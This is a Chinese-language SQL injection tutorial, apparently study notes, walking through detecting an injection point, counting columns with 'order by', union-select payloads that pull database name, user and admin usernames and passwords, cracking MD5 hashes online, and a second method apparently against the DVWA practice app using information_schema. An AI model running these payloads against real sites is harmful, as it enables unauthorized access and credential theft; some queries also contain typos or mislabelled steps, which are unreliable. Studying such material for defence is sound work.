# MQL注入

## 方法一

### 1

打开这个网址,查看URL地址,如果是一个动态URL，也就是说可以在地址栏中传参，这是SQL注入的基本条件

### 2

判断是否存在SQL注入可能。在帖子地址后面空上一格，敲入 and 1=1 ,然后 and 1=2

敲入 and 1=1 帖子返回正常， and 1=2 时帖子返回出错，说明SQL语句被执行

程序没有对敏感字符进行过滤。现在我们可以确定此处是一个SQL注入点，程序对带入的参数没有做任何处理，直接带到数据库的查询语句中

> 推测

Select * from [表名] where xxxx=xxx

### 3

爆数据库。确定注入点仅仅意味着开始

现在要判断数据库类型以及版本，构造语句如下：

```
and ord(mid(version(),1,1))>51 
```

发现返回正常页面，说明数据库是mysql，并且版本大于4.0，支持union查询，反之是4.0

### 4

爆字段。接着构造语句来猜表中字段

```
order by 10 
```

返回错误页面，说明字段小于10

```
order by 5    
```

 返回正常页面，说明字段介于5和10之间 

采用了“二分查找法”，这样可以减少判断次数，节省时间。如果采用从order by 1依次增加数值的方法来判断，需要7次才可以确定字段数，采用“二分查找法”只需要4次就够。当字段数很大时，二分查找法的优势更加明显，效率更高

### 5

爆表.确定字段之后现在我们要构造联合查询语句(union select )，语句如下

```
 and 1=2 union select 1,2,3,4,5,6
```

这里的3，5，6指的是我们可以把联合查询的对应位置替换为 我们想要查询的关键字，比如版本，数据库名称，主要是用来探测web系统的信息

### 6

爆用户名、密码。选择3 ,把3给替换掉，先查询下数据库库名，构造语句如下

```
and 1=2 union select 1,2,database(),4,5,6
```

```
and 1=2 union select 1,2,user(),4,5,6
```

```
nd 1=2 union select 1,2,username,4,5,6 from admin
```

```
and 1=2 union select 1,2,password,4,5,6 from admin
```

### 7

md5解密

字符串密码经过32位md5[加密](http://www.2cto.com/article/jiami/)后的值


(http://www.md5.com.cn ） 这个网址，我们把这个值复制进去，然后点击“MD5 CRACK“，“解密”时间，视密码复杂度而定

## 方法二



version() database() user()

### 1

漏洞判断

1’ and 1=1 #

1’ and 1=2 #

`'是为了闭合数据,#是为了注释后面的命令`

### 2

查询数据长度

Order by num#



### 3

查数据库名

MySQL中的DATABASE()函数返回默认或当前数据库的名称

DATABASE()函数返回的字符串或名称使用utf8字符集。如果没有默认数据库，则Database函数返回NULL

```
1’ union select 1,database() #
```

这里select后的1可以随机,为了匹配输出数据的个数 





#### 4

查数据库表名

```
1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
```



+ table_name，就是表名的意思

+ group_concat() 是一个函数，将同一个id的其他字段合并起来

+ information_schema.tables 是MySQL提供的自带的数据库，主要是提供用户自行建立的一些表的信息。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等

+ able_schema=database() 是指数据库名称为database()。

#### information_schema

在MySQL中，把 information_schema 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等

+ SCHEMATA表：提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表

+ TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息
+ COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表

+ STATISTICS表：提供了关于表索引的信息。是show index from schemaname.tablename的结果取之此表
+ USER_PRIVILEGES（用户权限）表：给出了关于全程权限的信息

+ SCHEMA_PRIVILEGES（方案权限）表：给出了关于方案（数据库）权限的信息

+ TABLE_PRIVILEGES（表权限）表：给出了关于表权限的信息

### 5

获取字段名

```
1' union select1,table_name from information_schema.tables where table_name='dvwa'#
```

column_name 表示列名



### 6

获取详细数据



```
1’ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #
```



```
concat(user,password)
```

将两个字段合成一个字段